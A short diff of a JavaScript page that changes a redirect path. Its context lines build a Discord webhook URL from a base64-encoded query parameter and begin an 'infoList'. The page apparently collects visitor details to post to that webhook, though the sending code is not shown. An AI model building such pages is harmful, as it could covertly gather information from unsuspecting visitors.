@@ -3,7 +3,7 @@
     const urlParams = new URLSearchParams(window.location.search);
     const l = urlParams.get('l');
     if (l === null){
-        window.location = "/create.html"
+        window.location = "/create"
     } else{
     var hook = "https://discordapp.com/api/webhooks/" + atob(l)
     const infoList = [];
